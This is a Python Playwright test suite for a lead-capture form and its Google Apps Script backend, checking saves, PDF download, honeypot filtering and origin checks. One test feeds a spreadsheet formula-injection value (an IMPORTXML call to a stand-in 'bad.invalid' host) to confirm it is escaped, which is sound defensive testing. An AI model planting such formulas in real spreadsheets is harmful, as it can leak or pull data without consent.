import json
import threading
import unittest
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlparse

from playwright.sync_api import sync_playwright

ROOT = Path(__file__).resolve().parents[1]
APPS_SCRIPT = ROOT / 'google-apps-script' / 'Code.gs'
SHEET_RESPONSE = ROOT / 'google-apps-script' / 'Response.html'


class LeadFlowHandler(SimpleHTTPRequestHandler):
    status = 'success'
    payload = None
    payloads = []
    payload_lock = threading.Lock()

    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=str(ROOT), **kwargs)

    def do_GET(self):
        request = urlparse(self.path)
        if request.path == '/index.html':
            html = (ROOT / 'index.html').read_text(encoding='utf-8')
            html = html.replace('data-lead-endpoint="https://script.google.com/macros/s/AKfycby-vKKQm6JI0p5oP1Ku0U28ODJJsuu1aBRdcObxlWJtahYDqlIMy09OjkKt6KhprMpQ/exec"', f'data-lead-endpoint=""' if 'without-endpoint' in request.query else f'data-lead-endpoint="http://127.0.0.1:{self.server.server_port}/apps-script"')
            body = html.encode()
            self.send_response(200); self.send_header('Content-Type', 'text/html; charset=utf-8'); self.send_header('Content-Length', str(len(body))); self.end_headers(); self.wfile.write(body); return
        if request.path == '/nested':
            params = parse_qs(request.query)
            result = json.loads(params['result'][0]); origin = json.loads(params['origin'][0])
            body = f'<script>parent.postMessage({json.dumps(result)},{json.dumps(origin)});</script>'.encode()
            self.send_response(200); self.send_header('Content-Type', 'text/html'); self.send_header('Content-Length', str(len(body))); self.end_headers(); self.wfile.write(body); return
        super().do_GET()

    def do_POST(self):
        if urlparse(self.path).path != '/apps-script': self.send_error(404); return
        length = int(self.headers.get('Content-Length', '0'))
        payload = parse_qs(self.rfile.read(length).decode())
        with self.payload_lock:
            type(self).payload = payload; type(self).payloads.append(payload)
        origin_url = urlparse(payload.get('source', [''])[0]); origin = f'{origin_url.scheme}://{origin_url.netloc}'
        result = json.dumps({'type':'aseta-lead-result','status':type(self).status,'requestId':payload.get('request_id',[''])[0],'attemptId':payload.get('attempt_id',[''])[0]})
        body = f'<!doctype html><script>parent.postMessage({result},{json.dumps(origin)});</script>'.encode()
        self.send_response(200); self.send_header('Content-Type','text/html; charset=utf-8'); self.send_header('Content-Length',str(len(body))); self.end_headers()
        try: self.wfile.write(body)
        except ConnectionAbortedError: pass

    def log_message(self, *_args): pass


class LeadFlowTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.server = ThreadingHTTPServer(('127.0.0.1', 0), LeadFlowHandler)
        cls.thread = threading.Thread(target=cls.server.serve_forever, daemon=True); cls.thread.start()
        cls.playwright = sync_playwright().start(); cls.browser = cls.playwright.chromium.launch(headless=True)

    @classmethod
    def tearDownClass(cls):
        cls.browser.close(); cls.playwright.stop(); cls.server.shutdown(); cls.server.server_close(); cls.thread.join()

    def setUp(self):
        LeadFlowHandler.status = 'success'; LeadFlowHandler.payload = None; LeadFlowHandler.payloads = []
        self.context = self.browser.new_context(accept_downloads=True); self.page = self.context.new_page()
        self.page.route('http://127.0.0.1/**', lambda route: self._mock_local_apps_script(route))
        self.page.goto(f'http://127.0.0.1:{self.server.server_port}/index.html#simulator')

    def _mock_local_apps_script(self, route):
        if urlparse(route.request.url).path != '/apps-script':
            route.continue_(); return
        payload = parse_qs(route.request.post_data or '')
        with LeadFlowHandler.payload_lock:
            LeadFlowHandler.payload = payload; LeadFlowHandler.payloads.append(payload)
        origin_url = urlparse(payload.get('source', [''])[0]); origin = f'{origin_url.scheme}://{origin_url.netloc}'
        result = json.dumps({'type':'aseta-lead-result','status':LeadFlowHandler.status,'requestId':payload.get('request_id',[''])[0],'attemptId':payload.get('attempt_id',[''])[0]})
        wrapper = f'<!doctype html><iframe src="/nested?result={json.dumps(result)}&origin={json.dumps(origin)}"></iframe>'
        route.fulfill(status=200, body=wrapper, content_type='text/html')

    def _mock_nested(self, route):
        from urllib.parse import unquote
        params = parse_qs(urlparse(route.request.url).query)
        result = json.loads(unquote(params['result'][0])); origin = json.loads(unquote(params['origin'][0]))
        body = f'<script>parent.postMessage({json.dumps(result)},{json.dumps(origin)});</script>'
        route.fulfill(status=200, body=body, content_type='text/html')

    def tearDown(self): self.context.close()

    def open_form(self):
        self.page.locator('#download-pdf').click(); self.assertTrue(self.page.locator('#lead-dialog').evaluate('(d)=>d.open'))

    def fill_form(self):
        values={'name':'Alya Pratama','email':'alya@example.co.id','company':'PT Contoh Nusantara','phone':'+62 812-3456-7890'}
        for key,value in values.items(): self.page.locator(f'#simulator-lead-form [name="{key}"]').fill(value)
        self.page.locator('[name="consent"]').check(); return values

    def run_apps_script(self, params, existing_rows=None, sheet_id='sheet-id'):
        source=APPS_SCRIPT.read_text(encoding='utf-8'); template=SHEET_RESPONSE.read_text(encoding='utf-8')
        return self.page.evaluate('''({source,templateSource,params,existingRows,sheetId})=>{
          const rows=structuredClone(existingRows);let released=false;
          const tmpl=html=>({payload:'',targetOrigin:'',evaluate(){const rendered=html.replace('<?!= payload ?>',this.payload).replace('<?!= targetOrigin ?>',this.targetOrigin);return{html:rendered,setXFrameOptionsMode(){return this;}};}});
          const sheet={getLastRow:()=>rows.length,getRange:()=>({setValues:v=>rows.push(...v),createTextFinder:v=>({matchEntireCell:()=>({findNext:()=>rows.slice(1).some(r=>r[13]===v)?{}:null})})}),appendRow:r=>rows.push(r)};
          window.HtmlService={XFrameOptionsMode:{ALLOWALL:'ALLOWALL'},createHtmlOutput:html=>({html}),createTemplateFromFile:()=>tmpl(templateSource)};
          window.PropertiesService={getScriptProperties:()=>({getProperty:()=>sheetId})};window.LockService={getScriptLock:()=>({waitLock(){},hasLock:()=>true,releaseLock:()=>{released=true;}})};window.SpreadsheetApp={openById:()=>({getSheetByName:()=>sheet,insertSheet:()=>sheet})};window.console={error(){}};
          const output=new Function('e',`${source}\\nreturn doPost(e);`)({parameter:params});if(!output.html.includes('postMessage'))return{result:null,rows,released};
          const match=output.html.match(/window\\.top\\.parent\\.postMessage\\((\\{.*\\}), (".*")\\);/);return{result:JSON.parse(match[1]),origin:match[2],rows,released};
        }''',{'source':source,'templateSource':template,'params':params,'existingRows':existing_rows or [],'sheetId':sheet_id})

    def test_form_requires_contact_and_consent(self):
        self.open_form(); required=self.page.locator('#simulator-lead-form [required]'); self.assertGreaterEqual(required.count(),5)
        self.assertTrue(self.page.locator('.lead-honeypot [name="website"]').evaluate('(f)=>f.tabIndex===-1'))

    def test_successful_save_downloads_pdf_and_opens_whatsapp(self):
        self.open_form();values=self.fill_form()
        with self.page.expect_download() as info:self.page.locator('#lead-submit').click()
        self.assertTrue(info.value.suggested_filename.endswith('.pdf'));self.assertEqual(LeadFlowHandler.payload['annual_loss'],['540000000'])
        for key,value in values.items():self.assertEqual(LeadFlowHandler.payload[key],[value])
        with self.page.expect_popup() as popup:self.page.locator('#share-whatsapp').click()
        message=parse_qs(urlparse(popup.value.url).query)['text'][0];self.assertIn(values['name'],message);self.assertIn('lampirkan pdf',message.lower())

    def test_failed_sheet_save_never_downloads_pdf(self):
        LeadFlowHandler.status='error';self.open_form();self.fill_form();self.page.locator('#lead-submit').click()
        error=self.page.locator('#lead-error');error.wait_for(state='visible');self.assertIn('belum tersimpan',error.inner_text().lower());self.assertFalse(self.page.locator('#lead-next-step').is_visible())

    def test_missing_endpoint_never_downloads_pdf(self):
        self.page.goto(f'http://127.0.0.1:{self.server.server_port}/index.html?without-endpoint#simulator');self.open_form();self.fill_form();self.page.locator('#lead-submit').click()
        error=self.page.locator('#lead-error');error.wait_for(state='visible');self.assertIn('belum dikonfigurasi',error.inner_text().lower());self.assertFalse(self.page.locator('#lead-next-step').is_visible())

    def test_apps_script_saves_once_escapes_formula_and_restricts_origin(self):
        params={'request_id':'req-1','attempt_id':'try-1','source':'https://pippoauliaa-dev.github.io/aseta-self-serve/','name':'=IMPORTXML("https://bad.invalid","//a")','email':'a@b.co','company':'PT A','phone':'0812','consent':'yes','downtime':'12','downtime_cost_per_hour':'2500000','reactive_repair_cost_monthly':'15000000','breakdown_reduction_target':'30','annual_loss':'540000000','annual_saving':'162000000'}
        saved=self.run_apps_script(params);self.assertEqual(saved['result']['status'],'success');self.assertEqual(json.loads(saved['origin']),'https://pippoauliaa-dev.github.io');self.assertEqual(saved['rows'][1][1],"'=IMPORTXML(\"https://bad.invalid\",\"//a\")");self.assertTrue(saved['released'])
        duplicate=self.run_apps_script(params,saved['rows']);self.assertEqual(len(duplicate['rows']),2)
        params['source']='https://bad.invalid';invalid=self.run_apps_script(params);self.assertIsNone(invalid['result']);self.assertEqual(invalid['rows'],[])

    def test_apps_script_honeypot_discards_bot(self):
        params={'request_id':'bot-1','attempt_id':'try-1','source':'https://pippoauliaa-dev.github.io/aseta-self-serve/','name':'Bot','email':'bot@b.co','company':'Bot','phone':'0812','consent':'yes','website':'filled'}
        result=self.run_apps_script(params);self.assertEqual(result['result']['status'],'success');self.assertEqual(result['rows'],[])


if __name__=='__main__':unittest.main()
